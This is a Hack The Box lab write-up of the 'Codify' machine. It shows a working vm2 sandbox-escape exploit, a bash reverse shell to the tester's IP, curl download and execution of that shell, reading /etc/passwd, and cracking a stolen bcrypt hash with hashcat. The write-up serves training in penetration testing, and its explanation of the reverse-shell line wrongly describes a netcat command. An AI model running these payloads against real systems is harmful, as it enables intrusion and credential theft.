@@ -1,0 +1,300 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title>Codify | emdeh</title> <meta name="author" content=" "> <meta name="description" content="Codify - Hack The Box walkthrough."> <meta name="keywords" content="cybersecurity, ai, technology cyber"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="https://unpkg.com/bootstrap-table@1.22.1/dist/bootstrap-table.min.css"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?19f3075a2d19613090fe9e16b564e1fe" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://emdeh.github.io/blog/2024/codify-walkthrough/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?e74e74bf055e5729d44a7d031a5ca6a5" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?96d6b3e1c3604aca8b6134c7afdd5db6"></script> <script src="/assets/js/dark_mode.js?9b17307bb950ffa2e34be0227f53558f"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-JZNPNDMG9P"></script> <script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-JZNPNDMG9P");</script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/">emdeh</a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about</a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">blog<span class="sr-only">(current)</span></a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">Repositories</a> </li> <li class="nav-item "> <a class="nav-link" href="/library/">Library</a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus</a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item" href="/blog/category/htb-machines">HTB-Machines</a> <div class="dropdown-divider"></div> <a class="dropdown-item" href="/blog/category/essential-eight/">Essential Eight</a> <div class="dropdown-divider"></div> <a class="dropdown-item" href="/blog/category/explainers/">Explainers</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fas fa-moon"></i> <i class="fas fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">Codify</h1> <p class="post-meta">January 25, 2024</p> <p class="post-tags"> <a href="/blog/2024"> <i class="fas fa-calendar fa-sm"></i> 2024 </a>   ·   <a href="/blog/tag/easy-box"> <i class="fas fa-hashtag fa-sm"></i> easy-box</a>   <a href="/blog/tag/htb"> <i class="fas fa-hashtag fa-sm"></i> HTB</a>   <a href="/blog/tag/arbitrary-code-execution"> <i class="fas fa-hashtag fa-sm"></i> arbitrary-code-execution</a>   <a href="/blog/tag/ace"> <i class="fas fa-hashtag fa-sm"></i> ace</a>   <a href="/blog/tag/remote-code-exeuction"> <i class="fas fa-hashtag fa-sm"></i> remote-code-exeuction</a>   <a href="/blog/tag/rce"> <i class="fas fa-hashtag fa-sm"></i> rce</a>   <a href="/blog/tag/glob"> <i class="fas fa-hashtag fa-sm"></i> glob</a>   <a href="/blog/tag/globbing"> <i class="fas fa-hashtag fa-sm"></i> globbing</a>   <a href="/blog/tag/secure-coding"> <i class="fas fa-hashtag fa-sm"></i> secure-coding</a>   <a href="/blog/tag/insecure-coding"> <i class="fas fa-hashtag fa-sm"></i> insecure-coding</a>   <a href="/blog/tag/node-js"> <i class="fas fa-hashtag fa-sm"></i> node.js</a>     ·   <a href="/blog/category/htb-machines"> <i class="fas fa-tag fa-sm"></i> HTB-Machines</a>   </p> </header> <article class="post-content"> <div id="markdown-content"> <h1 id="introduction">Introduction</h1> <hr> <p>Codify presents as a moderately challenging easy box, characterised by a privilege escalation that requires a bit of knowledge of bash secure scripting.</p> <p>Initial access is obtained by web-based Node.js code editor sandbox that allows arbitrary code execution on the host. Arbitrary code is then leveraged to fetch a reverse shell and achieve remote code execution.</p> <p>From there a hash is stolen following further system enumeration. Cracking the hash enables laterally movement, and privilege escalation is achieved by exploiting a vulnerability in a custom backup script that a standard user has elevated privileges over.</p> <p>The box exemplifies the importance of secure coding practices, and the need to use strong, complex, passphrases.</p> <h2 id="methods">Methods</h2> <h3 id="sandbox-escape">Sandbox escape</h3> <p>A sandbox escape refers to an exploit in which malicious code or software breaks out of the sandbox environment in which it’s supposed to be contained. Sandboxing is a security mechanism that isolates applications, processes, or code to reduce the potential harm from a compromised system.</p> <h3 id="arbitrary-code-execution">Arbitrary code execution</h3> <p>Arbitrary code execution is a security vulnerability that occurs when an attacker gains the ability to execute any code of their choice on a target system. This type of exploit allows the attacker to run commands that the system’s designers did not intend to permit, often leading to unauthorised actions such as data theft, system compromise, or further exploitation of other vulnerabilities.</p> <p>Key aspects of arbitrary code execution include:</p> <ol> <li> <p><strong>Control Over Execution Flow:</strong> The attacker finds a way to divert the normal execution flow of a program, injecting or directing it to run unexpected code.</p> </li> <li> <p><strong>Running Unauthorised Commands:</strong> The code executed can do anything that the application’s permissions allow, depending on the system’s privileges and security controls.</p> </li> <li> <p><strong>Common Causes:</strong> It often results from vulnerabilities like buffer overflows, injection flaws, insecure deserialization, or other weaknesses that allow an attacker to inject malicious code into a process.</p> </li> <li> <p><strong>Severity:</strong> Arbitrary code execution is considered a severe security issue because it can lead to complete system takeover, data breaches, or serve as a gateway for further attacks.</p> </li> <li> <p><strong>Mitigation:</strong> Prevention includes secure coding practices, input validation, using memory-safe languages, regular security testing, and keeping systems updated with security patches.</p> </li> </ol> <h3 id="remote-code-execution">Remote code execution</h3> <p>Remote Code Execution (RCE) is a severe security vulnerability that allows an attacker to run arbitrary code on a target machine or server across a network, such as the internet, without having physical access to it. This type of vulnerability is particularly dangerous as it can be exploited remotely to gain control over another system.</p> <p>The distinction between RCE and ACE lies in the attack vector.</p> <ul> <li>RCE is specifically about remote exploitation, where the attack occurs over a network.</li> <li>ACE is a broader term that covers any situation (both local and remote) where an attacker can execute code of their choice but does not specify the method of delivery.</li> </ul> <p>In the context of this post, the arbitrary code execution relates to running commands in the codify editor that the system did not intend to allow, whereas remote code execution relates to when a reverse shell is established and execution of commands was done remotely to the system.</p> <h2 id="tools">Tools</h2> <ul> <li><a href="https://github.com/nmap/nmap" rel="external nofollow noopener" target="_blank">Nmap</a></li> <li><a href="https://github.com/koalaman/shellcheck" rel="external nofollow noopener" target="_blank">Shellcheck</a></li> <li><a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244" rel="external nofollow noopener" target="_blank">Sandbox Escape in vm2@3.9.16</a></li> </ul> <h2 id="tactics">Tactics</h2> <ul> <li>Dictionary attack (Hashcat)</li> <li>Brute forcing (glob matching)</li> </ul> <h1 id="enumeration">Enumeration</h1> <p>As always, enumeration starts with Nmap scanning.</p> <h2 id="nmap-scanning">Nmap scanning</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-A</span> 10.129.6.167 | <span class="nb">tee </span>nmap-output.txt
+</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-01-24 04:53 GMT
+Nmap scan report <span class="k">for </span>10.129.6.167
+Host is up <span class="o">(</span>0.25s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   256 96071cc6773e07a0cc6f2419744d570b <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 0ba4c0cfe23b95aef6f5df7d0c88d6ce <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http    Apache httpd 2.4.52
+|_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Did not follow redirect to http://codify.htb/
+3000/tcp open  http    Node.js Express framework
+|_http-title: Codify
+Service Info: Host: codify.htb<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>32.50 seconds
+</code></pre></div></div> <h3 id="findings">Findings</h3> <ol> <li>Three ports open: <ul> <li>22</li> <li>80</li> <li>3000</li> </ul> </li> <li>Domain name http://codify.htb</li> </ol> <h2 id="domain-enumeration">Domain enumeration</h2> <p>The domain http://codify.htb can be added to the local hosts file:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.129.6.167 codify.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.129.6.167 codify.htb
+</code></pre></div></div> <p>This makes it reachable and reveals a page that purports to allow Node.js code to be tested in a sandbox environment. The site states that:</p> <blockquote> <p><em>“Codify is a simple web application that allows you to test your Node.js code easily…Codify uses sandboxing technology to run your code. This means that your code is executed in a safe and secure environment, without any access to the underlying system.”</em></p> </blockquote> <p><img src="/assets/img/2024-codify/20240125-codify-webpage.png" alt="20240125-codify-webpage.png" class="auto-resize"></p> <p>The site also lists some limitations that are in place for security of the platform. These include restricting the importation of <code class="language-plaintext highlighter-rouge">child_processes</code> and <code class="language-plaintext highlighter-rouge">fs</code> modules.</p> <p>The site goes on to say:</p> <blockquote> <p>“<em>This is to prevent users from executing arbitrary system commands, which could be a major security risk.</em>”</p> </blockquote> <p>Then lists the following modules as being available for import:</p> <ul> <li>url</li> <li>crypto</li> <li>util</li> <li>events</li> <li>assert</li> <li>stream</li> <li>path</li> <li>os</li> <li>zlib</li> </ul> <p>Another page details that the Code Editor uses the <strong>vm2</strong> library. Clicking the link leads to the <strong>3.9.16 version release of vm2</strong>.</p> <p>Researching <strong>vm2</strong> version 3.9.16 reveals a critical <strong>sandbox breakout</strong> vulnerability: https://nvd.nist.gov/vuln/detail/CVE-2023-29199</p> <blockquote> <p>“<em>attackers (can) bypass <code class="language-plaintext highlighter-rouge">handleException()</code> and leak unsanitized host exceptions which can be used to escape the sandbox and run arbitrary code in host context…</em>”</p> </blockquote> <h2 id="what-is-nodejs">What is Node.js</h2> <p>Node.js is an open-source, cross-platform JavaScript runtime environment that executes JavaScript code outside of a web browser. It’s built on Chrome’s V8 JavaScript engine and allows developers to use JavaScript to write command-line tools and for server-side scripting—running scripts server-side to produce dynamic web page content before the page is sent to the user’s web browser.</p> <h1 id="exploitation">Exploitation</h1> <h2 id="proof-of-concept">Proof of Concept</h2> <p><a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244" rel="external nofollow noopener" target="_blank">Sandbox Escape in vm2@3.9.16</a></p> <p><strong>vm2</strong> is a module in Node.js that creates isolated environments (sandboxes) to safely run untrusted JavaScript code. In <strong>version 3.9.16 of vm2</strong>, there is a security flaw in the way it processes errors or exceptions. Normally, vm2 should prevent code inside the sandbox from affecting or accessing the host system. The flaw involves a complex interaction where a custom error object can be manipulated to bypass vm2’s security checks. By exploiting this, an attacker can execute any code they want on the host system, not just within the sandbox.</p> <p>An example of how this vulnerability could be used to display the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file, which is a common file in Unix-like systems that contains user account information is:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">vm2</span><span class="dl">"</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">VM</span><span class="p">();</span>
+
+<span class="kd">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="s2">`
+err = {};
+const handler = {
+    getPrototypeOf(target) {
+        (function stack() {
+            new Error().stack;
+            stack();
+        })();
+    }
+};
+  
+const proxiedErr = new Proxy(err, handler);
+try {
+    throw proxiedErr;
+} catch ({constructor: c}) {
+    c.constructor('return process')().mainModule.require('child_process').execSync('cat /etc/passwd');
+}
+`</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span>
+
+</code></pre></div></div> <p>In this code:</p> <ul> <li>A custom error object <code class="language-plaintext highlighter-rouge">err</code> and a <code class="language-plaintext highlighter-rouge">handler</code> are created with a method that triggers an error.</li> <li>A JavaScript feature called <code class="language-plaintext highlighter-rouge">Proxy</code> is used to intercept operations on the <code class="language-plaintext highlighter-rouge">err</code> object, specifically the <code class="language-plaintext highlighter-rouge">getPrototypeOf</code> operation, which is supposed to return an object’s prototype.</li> <li>In the <code class="language-plaintext highlighter-rouge">try...catch</code> block, the proxied error object is thrown. Due to the vulnerability, the <code class="language-plaintext highlighter-rouge">catch</code> block is manipulated to access Node.js’s core modules.</li> <li>The <code class="language-plaintext highlighter-rouge">child_process</code> module’s <code class="language-plaintext highlighter-rouge">execSync</code> function is then used to execute the <code class="language-plaintext highlighter-rouge">cat /etc/passwd</code> command, displaying the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file.</li> <li>This output is then logged to the console.</li> </ul> <p>Running this code in the page’s editor successfully returns the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file, demonstrating the breakout and arbitrary command execution.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
+svc:x:1001:1001:,,,:/home/svc:/bin/bash
+fwupd-refresh:x:114:122:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+_laurel:x:998:998::/var/log/laurel:/bin/false
+</code></pre></div></div> <h2 id="initial-access">Initial access</h2> <p>The objective now is to use the PoC to achieve <strong>remote code execution</strong> by manipulating the target to fetch a reverse shell.</p> <h3 id="staging">Staging</h3> <p>To achieve this a simple file containing a reverse shell can be created:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+sh <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.15/4321 0&gt;&amp;1
+</code></pre></div></div> <p>The command has the following components:</p> <ul> <li> <code class="language-plaintext highlighter-rouge">#!/bin/bash</code> is the shebang line that tells the system this is a Bash script.</li> <li> <code class="language-plaintext highlighter-rouge">nc</code> is the Netcat command.</li> <li> <code class="language-plaintext highlighter-rouge">10.10.14.15</code> is the IP address where your Netcat listener is running.</li> <li> <code class="language-plaintext highlighter-rouge">4321</code> is the port on which your Netcat listener is listening.</li> <li> <code class="language-plaintext highlighter-rouge">-e /bin/bash</code> tells Netcat to execute the <code class="language-plaintext highlighter-rouge">/bin/bash</code> shell upon connecting. This will give the listener shell access to the system running the script.</li> </ul> <p>The file is saved as <code class="language-plaintext highlighter-rouge">shell.sh</code>.</p> <p>The file can then be served with a simple webserver:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="mi">8080</span>
+</code></pre></div></div> <p>The target can then be manipulated into fetching the shell by adding <code class="language-plaintext highlighter-rouge">curl http://10.10.14.15:8080/shell.sh -o shell</code> to the <code class="language-plaintext highlighter-rouge">execSync()</code> function in PoC like so:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">vm2</span><span class="dl">"</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">VM</span><span class="p">();</span>
+
+<span class="kd">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="s2">`
+err = {};
+const handler = {
+    getPrototypeOf(target) {
+        (function stack() {
+            new Error().stack;
+            stack();
+        })();
+    }
+};
+  
+const proxiedErr = new Proxy(err, handler);
+try {
+    throw proxiedErr;
+} catch ({constructor: c}) {
+    c.constructor('return process')().mainModule.require('child_process').execSync('curl http://10.10.14.15:8080/shell.sh -o shell');
+}
+`</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span>
+</code></pre></div></div> <p>The python webserver confirms the file was successfully fetched:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">└──╼</span> <span class="p">[</span><span class="err">★</span><span class="p">]</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="mi">8080</span>
+<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span> <span class="n">port</span> <span class="mi">8080</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="p">)</span> <span class="bp">...</span>
+<span class="mf">10.129</span><span class="p">.</span><span class="mf">6.167</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">24</span><span class="o">/</span><span class="n">Jan</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">05</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="sh">"</span><span class="s">GET /shell.sh HTTP/1.1</span><span class="sh">"</span> <span class="mi">200</span> <span class="o">-</span>
+</code></pre></div></div> <h3 id="exploitation-1">Exploitation</h3> <p>The next step is to make the file executable by sending <code class="language-plaintext highlighter-rouge">chmod +x shell</code> in the <code class="language-plaintext highlighter-rouge">execSync()</code> function.</p> <p>Then, after starting a <code class="language-plaintext highlighter-rouge">netcat</code>listener, the shell can be executed by sending <code class="language-plaintext highlighter-rouge">bash -x shell</code> to the target:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">vm2</span><span class="dl">"</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">VM</span><span class="p">();</span>
+
+<span class="kd">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="s2">`
+err = {};
+const handler = {
+    getPrototypeOf(target) {
+        (function stack() {
+            new Error().stack;
+            stack();
+        })();
+    }
+};
+  
+const proxiedErr = new Proxy(err, handler);
+try {
+    throw proxiedErr;
+} catch ({constructor: c}) {
+    c.constructor('return process')().mainModule.require('child_process').execSync('bash -x shell');
+}
+`</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span>
+</code></pre></div></div> <p>The listener successfully captures the reverse shell:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>nc <span class="nt">-lnvp</span> 4321
+Ncat: Version 7.93 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::4321
+Ncat: Listening on 0.0.0.0:4321
+Ncat: Connection from 10.129.6.167.
+Ncat: Connection from 10.129.6.167:44946.
+sh: 0: can<span class="s1">'t access tty; job control turned off
+$ whoami
+svc
+$ 
+</span></code></pre></div></div> <h3 id="upgrading-the-shell">Upgrading the shell</h3> <p>The shell can then be upgraded for interactivity using:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="sh">"</span><span class="s">import pty;pty.spawn(</span><span class="sh">'</span><span class="s">/bin/bash</span><span class="sh">'</span><span class="s">)</span><span class="sh">"</span>
+
+<span class="n">svc</span><span class="nd">@codify</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span> 
+
+</code></pre></div></div> <h2 id="lateral-movement">Lateral movement</h2> <p>Exploring the site’s <code class="language-plaintext highlighter-rouge">/www</code> directory in the root <code class="language-plaintext highlighter-rouge">/var</code> directory finds a <code class="language-plaintext highlighter-rouge">tickets.db</code> file.</p> <p>Catting this file finds a hash for the user <code class="language-plaintext highlighter-rouge">joshua</code>.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svc@codify:/var/www/contact<span class="nv">$ </span><span class="nb">cat </span>tickets.db
+<span class="nb">cat </span>tickets.db
+�T5��T�format 3@  .WJ
+       otableticketsticketsCREATE TABLE tickets <span class="o">(</span><span class="nb">id </span>INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT<span class="o">)</span>P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence<span class="o">(</span>name,seq<span class="o">)</span>��	tableusersusersCREATE TABLE <span class="nb">users</span> <span class="o">(</span>
+        <span class="nb">id </span>INTEGER PRIMARY KEY AUTOINCREMENT, 
+        username TEXT UNIQUE, 
+        password TEXT
+��G�joshua<span class="nv">$2a$12$SOn8Pf6z8fO</span>/nVsNbAAequ/&lt;REDACTED&gt;/p/Zw2
+��
+����ua  <span class="nb">users
+             </span>ickets
+r]r�h%%�Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to <span class="nb">set </span>this up locally? Like instead of coming to this site, can I download this and <span class="nb">set </span>it up <span class="k">in </span>my own computer? A feature like that would be nice.open� <span class="p">;</span>�wTom HanksNeed networking modulesI think it would be better <span class="k">if </span>you can implement a way to handle network-based stuff. Would <span class="nb">help </span>me out a lot. Thanks!opensvc@codify:/var/www/contact<span class="nv">$ </span>
+</code></pre></div></div> <p>The hash appears to be a bcrypt hash.</p> <blockquote> <p><em>Bcrypt hashes are recognisable by their format, which usually starts with <code class="language-plaintext highlighter-rouge">$2a$</code>, <code class="language-plaintext highlighter-rouge">$2b$</code>, <code class="language-plaintext highlighter-rouge">$2x$</code>, or <code class="language-plaintext highlighter-rouge">$2y$</code> followed by a cost parameter (like <code class="language-plaintext highlighter-rouge">$12$</code> in your hash), and then the salt and hash value.</em></p> </blockquote> <p>The hash can be formatted for hashcat by dropping the username and adding it to a file (or passing it directly to the command).</p> <p>In Hashcat, the mode to use for cracking bcrypt hashes is <code class="language-plaintext highlighter-rouge">3200</code>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 3200 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat <span class="o">(</span>v6.1.1<span class="o">)</span> starting...
+
+OpenCL API <span class="o">(</span>OpenCL 1.2 LINUX<span class="o">)</span> - Platform <span class="c">#1 [Intel(R) Corporation]</span>
+<span class="o">==================================================================</span>
+<span class="k">*</span> Device <span class="c">#1: AMD EPYC 7543 32-Core Processor, 7855/7919 MB (1979 MB allocatable), 4MCU</span>
+
+OpenCL API <span class="o">(</span>OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG<span class="o">)</span> - Platform <span class="c">#2 [The pocl project]</span>
+<span class="o">=============================================================================================================================</span>
+<span class="k">*</span> Device <span class="c">#2: pthread-AMD EPYC 7543 32-Core Processor, skipped</span>
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 72
+
+Hashes: 1 digests<span class="p">;</span> 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+<span class="k">*</span> Zero-Byte
+<span class="k">*</span> Single-Hash
+<span class="k">*</span> Single-Salt
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required <span class="k">for </span>this attack: 65 MB
+
+Dictionary cache built:
+<span class="k">*</span> Filename..: /usr/share/wordlists/rockyou.txt
+<span class="k">*</span> Passwords.: 14344392
+<span class="k">*</span> Bytes.....: 139921507
+<span class="k">*</span> Keyspace..: 14344385
+<span class="k">*</span> Runtime...: 1 sec
+
+</code></pre></div></div> <p>The hash cracks</p> <p><img src="/assets/img/2024-codify/20240125-codify-hash.png" alt="20240125-codify-hash.png" class="auto-resize"></p> <p>With the acquired password, SSH can be used to authenticate to the target as the user <strong>joshua.</strong></p> <p>And the user flag is obtained.</p> <div class="language-ssh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">└──╼</span> <span class="err">[★]$</span> <span class="k">ssh</span> joshua@10.129.6.167
+<span class="k">joshua</span>@codify:~<span class="err">$</span> ls
+<span class="k">user</span>.txt
+<span class="k">joshua</span>@codify:~<span class="err">$</span> cat user.txt 
+&lt;REDACTED&gt;
+
